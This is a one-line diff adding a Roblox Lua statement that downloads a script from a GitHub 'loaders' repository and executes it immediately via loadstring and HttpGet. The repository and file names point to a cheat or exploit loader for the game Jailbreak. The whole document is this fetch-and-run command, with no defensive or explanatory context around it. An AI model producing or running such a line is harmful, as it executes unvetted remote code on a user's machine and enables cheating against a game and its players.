@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/TealKnightFree/loaders/main/loaders/jailbreak-spam3-4ts355hmo6dhu3.lua"))()
